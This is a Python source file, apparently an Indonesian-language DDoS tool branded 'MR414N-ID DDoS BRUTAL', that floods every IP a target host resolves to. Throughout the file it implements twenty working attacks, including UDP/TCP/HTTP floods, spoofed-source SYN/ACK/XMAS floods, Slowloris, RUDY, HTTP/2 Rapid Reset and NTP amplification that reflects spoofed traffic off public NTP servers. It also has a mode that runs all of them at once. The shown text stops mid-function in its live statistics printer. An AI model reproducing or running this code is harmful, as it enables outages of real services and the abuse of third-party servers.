# lang: Python 3.11+, file: ddos.py
# build: pip install colorama dnspython scapy
# usage: python ddos.py (root/sudo required untuk raw socket methods)
# stop: Ctrl+C

import socket
import threading
import random
import time
import sys
import os
import struct
from concurrent.futures import ThreadPoolExecutor
try:
    import dns.resolver
    DNS_LIB = True
except ImportError:
    DNS_LIB = False
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort, conf
    conf.verb = 0
    SCAPY_LIB = True
except ImportError:
    SCAPY_LIB = False
from colorama import Fore, Style, init

init(autoreset=True)

RUNNING = True

# ---- RAINBOW ----

def rainbow(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    out = ""
    i = 0
    for ch in text:
        if ch != ' ':
            out += colors[i % len(colors)] + Style.BRIGHT + ch
            i += 1
        else:
            out += ' '
    return out + Style.RESET_ALL

# ---- BEBEK LINUX ----

def tampil_bebek():
    bebek_lines = [
        r"        .88888888:.",
        r"       88888888.88888.",
        r"     .8888888888888888.",
        r"     888888888888888888",
        r"     88' _`88'_  `8888.",
        r"     88 88 88 88  88888",
        r"     88_88_::_88_:88888",
        r"     88:::,::,:::::8888",
        r"     88`:::::::::'`8888",
        r"    .88  `:::::'    8:88.",
        r"   8888            `8:888.",
        r" .8888'             `888888.",
        r".8888:..  .::.  ...:'8888888:.",
        r"8888.'     :'     `'::`88:88888",
        r"`8888;..  ;;;;.  ;;;; `88:88888",
        r" `8888888888888' 8888  88:88888",
        r"  `.8888888888'  8888  88888888",
    ]
    colors = [Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.YELLOW, Fore.GREEN]
    for idx, line in enumerate(bebek_lines):
        print(colors[idx % len(colors)] + Style.BRIGHT + line)
        time.sleep(0.03)
    print()

# ---- BANNER ----

def tampil_banner():
    baris = [
        "███╗   ███╗██████╗ ██╗  ██╗ ██╗██╗  ██╗███╗   ██╗      ██╗██████╗ ",
        "████╗ ████║██╔══██╗ ██╗██╔╝ ██║██║  ██║████╗  ██║      ██║██╔══██╗",
        "██╔████╔██║██████╔╝  ████╔╝  ██║███████║██╔██╗ ██║      ██║██║  ██║",
        "██║╚██╔╝██║██╔══██╗ ██╔╝██╗  ╚═╝╚════██║██║╚██╗██║      ██║██║  ██║",
        "██║ ╚═╝ ██║██║  ██║██╔╝  ██╗ ██╗     ██║██║ ╚████║      ██║██████╔╝",
        "╚═╝     ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝ ╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝",
    ]
    print()
    for line in baris:
        print(rainbow(line))
        time.sleep(0.06)
    print()

def tampil_ddos():
    ddos_baris = [
        "██████╗ ██████╗  ██████╗ ███████╗",
        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
        "██║  ██║██║  ██║██║   ██║███████╗",
        "██║  ██║██║  ██║██║   ██║╚════██║",
        "██████╔╝██████╔╝╚██████╔╝███████║",
        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝",
    ]
    for line in ddos_baris:
        print(Fore.CYAN + Style.BRIGHT + line)
        time.sleep(0.06)
    print()

# ---- LOADING ----

def loading_bar(teks, durasi=1.2):
    bar_len = 40
    start = time.time()
    while True:
        elapsed = time.time() - start
        ratio = min(elapsed / durasi, 1.0)
        filled = int(bar_len * ratio)
        bar = "█" * filled + "░" * (bar_len - filled)
        pct = int(ratio * 100)
        sys.stdout.write(
            f"\r{Fore.GREEN}[{Fore.YELLOW}{bar}{Fore.GREEN}] "
            f"{Fore.WHITE}{Style.BRIGHT}{pct}% {Fore.CYAN}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        if ratio >= 1.0:
            break
        time.sleep(0.02)
    print()

def spinner(teks, durasi=1.0):
    chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    end = time.time() + durasi
    i = 0
    while time.time() < end:
        sys.stdout.write(
            f"\r{Fore.MAGENTA}[{chars[i % len(chars)]}] "
            f"{Fore.WHITE}{Style.BRIGHT}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        time.sleep(0.07)
        i += 1
    print()

# ---- RESOLVE SEMUA IP ----

def resolve_semua_ip(host):
    ips = set()
    if DNS_LIB:
        try:
            hasil = dns.resolver.resolve(host, 'A')
            for r in hasil:
                ips.add(r.address)
        except Exception:
            pass
    try:
        hasil = socket.getaddrinfo(host, None)
        for r in hasil:
            ip = r[4][0]
            if ':' not in ip:
                ips.add(ip)
    except Exception:
        pass
    try:
        _, _, addr_list = socket.gethostbyname_ex(host)
        for ip in addr_list:
            ips.add(ip)
    except Exception:
        pass
    return list(ips)

# ---- INPUT ----

def input_interaktif():
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL — AUTO MULTI-IP ⚡")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

    while True:
        raw = input(
            f"{Fore.YELLOW}{Style.BRIGHT}  [?] MASUKKAN LINK / IP TARGET{Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
        ).strip()
        print(Style.RESET_ALL, end="")
        if not raw:
            print(Fore.RED + "  [!] Target tidak boleh kosong.")
            continue
        host = raw.replace("https://","").replace("http://","").split("/")[0]

        spinner(f"Resolving semua IP dari {host}...", 1.5)
        ips = resolve_semua_ip(host)

        if not ips:
            print(Fore.RED + f"  [!] Gagal resolve {host}. Coba lagi.")
            continue

        print()
        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
        print(Fore.GREEN + Style.BRIGHT + f"  [✓] Ditemukan {len(ips)} IP:")
        for idx, ip in enumerate(ips, 1):
            print(f"{Fore.CYAN}      [{idx}] {Fore.RED}{Style.BRIGHT}{ip}")
        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
        print()
        break

    port_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PORT {Fore.WHITE}(default 80){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    port = int(port_raw) if port_raw.isdigit() else 80

    print(f"{Fore.YELLOW}{Style.BRIGHT}  [?] MODE SERANGAN:")
    print(f"{Fore.CYAN}      [1]  UDP Flood")
    print(f"{Fore.CYAN}      [2]  TCP Flood")
    print(f"{Fore.CYAN}      [3]  HTTP Flood")
    print(f"{Fore.CYAN}      [4]  SYN Flood       (butuh root + scapy)")
    print(f"{Fore.CYAN}      [5]  ACK Flood        (butuh root + scapy)")
    print(f"{Fore.CYAN}      [6]  RST Flood        (butuh root + scapy)")
    print(f"{Fore.CYAN}      [7]  FIN Flood        (butuh root + scapy)")
    print(f"{Fore.CYAN}      [8]  XMAS Flood       (butuh root + scapy)")
    print(f"{Fore.CYAN}      [9]  NULL Flood       (butuh root + scapy)")
    print(f"{Fore.CYAN}      [10] ICMP Flood       (butuh root + scapy)")
    print(f"{Fore.CYAN}      [11] Slowloris")
    print(f"{Fore.CYAN}      [12] RUDY")
    print(f"{Fore.CYAN}      [13] TLS Exhaustion")
    print(f"{Fore.CYAN}      [14] HTTP/2 Rapid Reset")
    print(f"{Fore.CYAN}      [15] Cache Bypass HTTP")
    print(f"{Fore.CYAN}      [16] POST Body Flood")
    print(f"{Fore.CYAN}      [17] Connection Exhaustion")
    print(f"{Fore.CYAN}      [18] Keep-Alive Exhaustion")
    print(f"{Fore.CYAN}      [19] UDP Fragmentation (butuh root + scapy)")
    print(f"{Fore.CYAN}      [20] NTP Amplification (butuh root)")
    print(f"{Fore.RED}      [21] MIX — SEMUA METODE SEKALIGUS 💀")
    mode_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PILIH {Fore.WHITE}(1-21, default 21){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")

    mode_map_input = {
        "1":"udp","2":"tcp","3":"http","4":"syn","5":"ack",
        "6":"rst","7":"fin","8":"xmas","9":"null","10":"icmp",
        "11":"slowloris","12":"rudy","13":"tls","14":"h2reset",
        "15":"cache","16":"post","17":"conn","18":"keepalive",
        "19":"frag","20":"ntp","21":"mix"
    }
    mode = mode_map_input.get(mode_raw, "mix")

    thr_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] JUMLAH THREAD {Fore.WHITE}(default 500){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    threads = int(thr_raw) if thr_raw.isdigit() else 500

    ukuran_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] UKURAN PAYLOAD {Fore.WHITE}(bytes, default 65000){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    ukuran = int(ukuran_raw) if ukuran_raw.isdigit() else 65000

    return host, ips, port, mode, threads, ukuran

# ---- TAMPIL INFO ----

def tampil_info(host, ips, port, mode, threads, ukuran):
    per_ip = threads // len(ips)
    print()
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN MULTI-IP DIMULAI — CTRL+C UNTUK STOP 💀")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(f"{Fore.YELLOW}  [»] HOST        : {Fore.RED}{Style.BRIGHT}{host}")
    for idx, ip in enumerate(ips, 1):
        print(f"{Fore.YELLOW}  [»] IP [{idx}]      : {Fore.RED}{Style.BRIGHT}{ip}")
    print(f"{Fore.YELLOW}  [»] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
    print(f"{Fore.YELLOW}  [»] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
    print(f"{Fore.YELLOW}  [»] TOTAL THREAD: {Fore.RED}{Style.BRIGHT}{threads}")
    print(f"{Fore.YELLOW}  [»] THREAD/IP   : {Fore.RED}{Style.BRIGHT}{per_ip}")
    print(f"{Fore.YELLOW}  [»] PAYLOAD     : {Fore.RED}{Style.BRIGHT}{ukuran} bytes")
    print(f"{Fore.YELLOW}  [»] SCAPY       : {Fore.GREEN if SCAPY_LIB else Fore.RED}{Style.BRIGHT}{'tersedia' if SCAPY_LIB else 'tidak ada — raw methods dilewati'}")
    print(f"{Fore.YELLOW}  [»] STOP        : {Fore.GREEN}{Style.BRIGHT}Ctrl+C")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

# ---- STATS ----

stats_per_ip = {}
lock = threading.Lock()

def init_stats(ips):
    for ip in ips:
        stats_per_ip[ip] = {"kirim": 0, "error": 0, "bytes": 0}

# ============================================================
# FLOOD FUNCTIONS
# ============================================================

# --- 1. UDP Flood ---
def udp_flood(ip, port, ukuran):
    global RUNNING
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    tujuan = (ip, port)
    while RUNNING:
        try:
            sock.sendto(random.randbytes(ukuran), tujuan)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += ukuran
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)
    sock.close()

# --- 2. TCP Flood ---
def tcp_flood(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.sendall(random.randbytes(ukuran))
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += ukuran
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# --- 3. HTTP Flood ---
def http_flood(ip, port, ukuran):
    global RUNNING
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36",
        "curl/8.4.0", "python-requests/2.31.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]
    paths = [
        "/", "/index.php", "/login", "/admin", "/wp-admin",
        "/api/v1/users", "/search?q=" + "A"*256,
        "/.env", "/config.php", "/backup.zip",
    ]
    rnd_ip = lambda: f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            ua = random.choice(uas)
            path = random.choice(paths)
            req = (
                f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\n"
                f"Accept: */*\r\nConnection: keep-alive\r\n"
                f"X-Forwarded-For: {rnd_ip()}\r\nX-Real-IP: {rnd_ip()}\r\n\r\n"
            ).encode()
            s.sendall(req)
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(req)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# --- 4. SYN Flood (scapy) ---
def syn_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags="S", seq=random.randint(0, 2**32-1))
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 5. ACK Flood (scapy) ---
def ack_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags="A", seq=random.randint(0, 2**32-1))
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 6. RST Flood (scapy) ---
def rst_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags="R")
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 7. FIN Flood (scapy) ---
def fin_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags="F")
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 8. XMAS Flood (scapy) FIN+PSH+URG ---
def xmas_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags="FPU")
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 9. NULL Flood (scapy) no flags ---
def null_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  TCP(dport=port, sport=RandShort(), flags=0)
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 10. ICMP Flood (scapy) ---
def icmp_flood(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            pkt = IP(dst=ip, src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                  ICMP() / random.randbytes(min(ukuran, 1400))
            send(pkt, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(pkt)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.005)

# --- 11. Slowloris ---
def slowloris(ip, port, ukuran):
    global RUNNING
    sockets = []
    # buka ratusan koneksi
    for _ in range(200):
        if not RUNNING:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n".encode())
            sockets.append(s)
        except Exception:
            pass
    while RUNNING:
        for s in list(sockets):
            try:
                s.sendall(f"X-Header: {random.randint(0,9999)}\r\n".encode())
                with lock:
                    stats_per_ip[ip]["kirim"] += 1
                    stats_per_ip[ip]["bytes"] += 20
            except Exception:
                sockets.remove(s)
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(4)
                    ns.connect((ip, port))
                    ns.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n".encode())
                    sockets.append(ns)
                except Exception:
                    with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(10)

# --- 12. RUDY (R-U-Dead-Yet) ---
def rudy(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            body_size = random.randint(100000, 999999)
            req = (
                f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {body_size}\r\nConnection: keep-alive\r\n\r\n"
            ).encode()
            s.sendall(req)
            sent = 0
            while RUNNING and sent < body_size:
                try:
                    s.sendall(random.randbytes(1))
                    sent += 1
                    with lock:
                        stats_per_ip[ip]["kirim"] += 1
                        stats_per_ip[ip]["bytes"] += 1
                    time.sleep(random.uniform(5, 15))
                except Exception:
                    break
            s.close()
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1

# --- 13. TLS Exhaustion ---
def tls_exhaustion(ip, port, ukuran):
    global RUNNING
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while RUNNING:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(3)
            raw.connect((ip, port))
            s = ctx.wrap_socket(raw, server_hostname=ip)
            # mulai handshake lalu idle — tidak kirim apa-apa
            time.sleep(random.uniform(1, 3))
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += 300
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.05)

# --- 14. HTTP/2 Rapid Reset (CVE-2023-44487) ---
def h2_rapid_reset(ip, port, ukuran):
    global RUNNING
    # simulasi via TCP — kirim stream frame lalu RST_STREAM berulang
    # preface HTTP/2 + SETTINGS + HEADERS + RST_STREAM loop
    H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    SETTINGS_FRAME = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    # HEADERS frame stream 1
    HEADERS_FRAME = (
        b"\x00\x00\x05"  # length
        b"\x01"          # type HEADERS
        b"\x05"          # flags END_HEADERS | END_STREAM
        b"\x00\x00\x00\x01"  # stream id 1
        b"\x82\x84\x86\x41\x8a"  # minimal HPACK :method GET etc
    )
    RST_STREAM = b"\x00\x00\x04\x03\x00\x00\x00\x00\x01\x00\x00\x00\x08"  # stream 1, CANCEL
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.sendall(H2_PREFACE + SETTINGS_FRAME)
            for _ in range(100):
                if not RUNNING:
                    break
                s.sendall(HEADERS_FRAME + RST_STREAM)
                with lock:
                    stats_per_ip[ip]["kirim"] += 1
                    stats_per_ip[ip]["bytes"] += len(HEADERS_FRAME + RST_STREAM)
            s.close()
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# --- 15. Cache Bypass ---
def cache_bypass(ip, port, ukuran):
    global RUNNING
    paths = ["/", "/index.php", "/api/data", "/search", "/products"]
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            path = random.choice(paths)
            # random query param paksa bypass CDN cache
            buster = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))
            req = (
                f"GET {path}?cb={buster}&t={int(time.time()*1000)} HTTP/1.1\r\n"
                f"Host: {ip}\r\nCache-Control: no-cache, no-store\r\n"
                f"Pragma: no-cache\r\nConnection: close\r\n\r\n"
            ).encode()
            s.sendall(req)
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(req)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# --- 16. POST Body Flood ---
def post_flood(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            body = random.randbytes(ukuran)
            req = (
                f"POST / HTTP/1.1\r\nHost: {ip}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + body
            s.sendall(req)
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(req)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# --- 17. Connection Exhaustion ---
def conn_exhaustion(ip, port, ukuran):
    global RUNNING
    sockets = []
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((ip, port))
            sockets.append(s)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += 0
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
            # bersihkan koneksi mati
            for dead in list(sockets):
                try:
                    dead.close()
                except Exception:
                    pass
            sockets.clear()
        time.sleep(0.05)

# --- 18. Keep-Alive Exhaustion ---
def keepalive_exhaustion(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            req = (
                f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
                f"Connection: keep-alive\r\n"
                f"Keep-Alive: timeout=9999, max=9999\r\n\r\n"
            ).encode()
            s.sendall(req)
            # idle di koneksi — tidak tutup
            timeout = random.randint(30, 90)
            start = time.time()
            while RUNNING and (time.time() - start) < timeout:
                time.sleep(1)
                # kirim keep-alive ping
                try:
                    s.sendall(b" ")
                    with lock:
                        stats_per_ip[ip]["kirim"] += 1
                        stats_per_ip[ip]["bytes"] += 1
                except Exception:
                    break
            s.close()
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1

# --- 19. UDP Fragmentation (scapy) ---
def udp_frag(ip, port, ukuran):
    global RUNNING
    if not SCAPY_LIB:
        return
    while RUNNING:
        try:
            payload = random.randbytes(min(ukuran, 60000))
            pkt = IP(dst=ip, flags="MF") / UDP(dport=port, sport=RandShort()) / payload
            # fragment jadi potongan 8-byte unit
            frags = pkt.fragment(fragsize=8)
            for f in frags:
                send(f, verbose=0)
            with lock:
                stats_per_ip[ip]["kirim"] += len(frags)
                stats_per_ip[ip]["bytes"] += len(payload)
        except Exception:
            with lock: stats_per_ip[ip]["error"] += 1
        time.sleep(0.02)

# --- 20. NTP Amplification ---
def ntp_amp(ip, port, ukuran):
    global RUNNING
    # kirim monlist request ke NTP server terbuka
    # source IP di-spoof ke target — butuh raw socket
    # tanpa scapy: kirim UDP biasa ke port 123 (tidak ada spoofing, tapi tetap stres NTP)
    NTP_MONLIST = (
        b"\x17\x00\x03\x2a" + b"\x00" * 4
    )
    if SCAPY_LIB:
        # dengan spoofing
        while RUNNING:
            try:
                # pakai beberapa NTP server publik sebagai reflektor
                ntp_servers = [
                    "pool.ntp.org", "time.windows.com",
                    "time.google.com", "time.cloudflare.com",
                ]
                try:
                    ntp_ip = socket.gethostbyname(random.choice(ntp_servers))
                except Exception:
                    ntp_ip = "216.239.35.0"
                pkt = IP(dst=ntp_ip, src=ip) / UDP(dport=123, sport=RandShort()) / NTP_MONLIST
                send(pkt, verbose=0)
                with lock:
                    stats_per_ip[ip]["kirim"] += 1
                    stats_per_ip[ip]["bytes"] += len(NTP_MONLIST)
            except Exception:
                with lock: stats_per_ip[ip]["error"] += 1
            time.sleep(0.01)
    else:
        # tanpa spoofing — flood langsung ke port NTP target
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while RUNNING:
            try:
                sock.sendto(NTP_MONLIST, (ip, 123))
                with lock:
                    stats_per_ip[ip]["kirim"] += 1
                    stats_per_ip[ip]["bytes"] += len(NTP_MONLIST)
            except Exception:
                with lock: stats_per_ip[ip]["error"] += 1
            time.sleep(0.01)
        sock.close()

# ============================================================
# MAP SEMUA FUNGSI
# ============================================================

ALL_FLOOD_FUNCTIONS = [
    udp_flood, tcp_flood, http_flood, syn_flood, ack_flood,
    rst_flood, fin_flood, xmas_flood, null_flood, icmp_flood,
    slowloris, rudy, tls_exhaustion, h2_rapid_reset, cache_bypass,
    post_flood, conn_exhaustion, keepalive_exhaustion, udp_frag, ntp_amp,
]

FLOOD_MAP = {
    "udp": [udp_flood],
    "tcp": [tcp_flood],
    "http": [http_flood],
    "syn": [syn_flood],
    "ack": [ack_flood],
    "rst": [rst_flood],
    "fin": [fin_flood],
    "xmas": [xmas_flood],
    "null": [null_flood],
    "icmp": [icmp_flood],
    "slowloris": [slowloris],
    "rudy": [rudy],
    "tls": [tls_exhaustion],
    "h2reset": [h2_rapid_reset],
    "cache": [cache_bypass],
    "post": [post_flood],
    "conn": [conn_exhaustion],
    "keepalive": [keepalive_exhaustion],
    "frag": [udp_frag],
    "ntp": [ntp_amp],
    "mix": ALL_FLOOD_FUNCTIONS,
}

# ---- STATISTIK LIVE MULTI-IP ----

def cetak_statistik(ips, port, mode):
    global RUNNING
    bar_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
    skulls = ["💀","👾","⚡","🔥","💥"]
    tick  = 0
    start = time.time()

    while RUNNING:
        with lock:
            snapshot = {ip: dict(stats_per_ip[ip]) for ip in ips}

        elapsed = max(0.1, time.time() - start)
        bc = bar_colors[tick % len(bar_colors)]
        sk = skulls[tick % len(skulls)]

        total_kirim = sum(s["kirim"] for s in snapshot.values())
        total_error = sum(s["error"] for s in snapshot.values())
        total_bytes = sum(s["bytes"] for s in snapshot.values())
        total_pps   = total_kirim / elapsed
        total_mbps  = (total_bytes * 8) / (elapsed * 1_000_000)

        lines = len(ips) + 2
        sys.stdout.write(f"\033[{lines}A\033[J")

        print(
            f"{bc}{Style.BRIGHT}{sk} TOTAL "
            f"{Fore.WHITE}│ {Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{total_kirim:,} "
            f"{Fore.WHITE}│ {Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{total_pps:,.0f} "
            f"{Fore.WHITE}│ {Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{total_mbps:.2f} "
            f"{Fore.WHITE}│ {Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{total_error:,} "
            f"{Fore.WHITE}│ {Fore.YELLOW}WAKTU:{Fore.WHITE}{Style.BRIGHT}{elapsed:.0f}s"
            f"{Style.RESET_ALL}"
        )
        print(Fore.WHITE + Style.BRIGHT + "─" * 65 + Style.RESET_ALL)

        for ip in ips:
            s    = snapshot[ip]
            pps  = s["kirim"] / elapsed
            mbps = (s["bytes"] * 8) / (elapsed * 1_000_000)
            print(
                f"  {Fore.RED}{Style.BRIGHT}{ip:<18}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{s['kirim']:>8,}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:>8,.0f}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:>6.2f}{Style.RESET_ALL} "
